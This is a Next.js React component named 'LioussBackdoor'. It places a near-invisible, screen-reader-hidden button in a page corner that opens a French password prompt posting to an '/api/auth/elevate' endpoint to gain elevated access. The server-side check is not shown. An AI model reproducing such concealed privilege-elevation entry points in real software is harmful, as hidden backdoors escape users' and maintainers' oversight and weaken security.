"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export function LioussBackdoor() {
  const router = useRouter();
  const [open, setOpen] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    const res = await fetch("/api/auth/elevate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password }),
    });
    setBusy(false);
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      setError(data.error ?? "Erreur.");
      return;
    }
    setOpen(false);
    setPassword("");
    router.refresh();
  }

  return (
    <>
      <button
        aria-hidden="true"
        tabIndex={-1}
        onClick={() => setOpen(true)}
        className="fixed bottom-1 right-1 z-40 h-3 w-3 rounded-full opacity-[0.08] hover:opacity-40 transition-opacity focus:opacity-40 outline-none"
        style={{ background: "var(--muted)" }}
      />

      {open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <form
            onSubmit={submit}
            className="w-full max-w-xs rounded-2xl border border-border bg-surface p-6 shadow-2xl space-y-4"
          >
            <p className="text-sm text-muted">Confirme ton mot de passe</p>
            <input
              type="password"
              autoFocus
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full rounded-lg bg-surface-2 border border-border px-3 py-2 outline-none focus:border-accent"
            />
            {error && <p className="text-danger text-sm">{error}</p>}
            <div className="flex gap-2 justify-end">
              <button
                type="button"
                onClick={() => {
                  setOpen(false);
                  setPassword("");
                  setError(null);
                }}
                className="rounded-lg px-3 py-1.5 text-sm text-muted hover:text-foreground"
              >
                Annuler
              </button>
              <button
                type="submit"
                disabled={busy || !password}
                className="rounded-lg bg-accent px-3 py-1.5 text-sm font-semibold text-white disabled:opacity-50"
              >
                Valider
              </button>
            </div>
          </form>
        </div>
      )}
    </>
  );
}
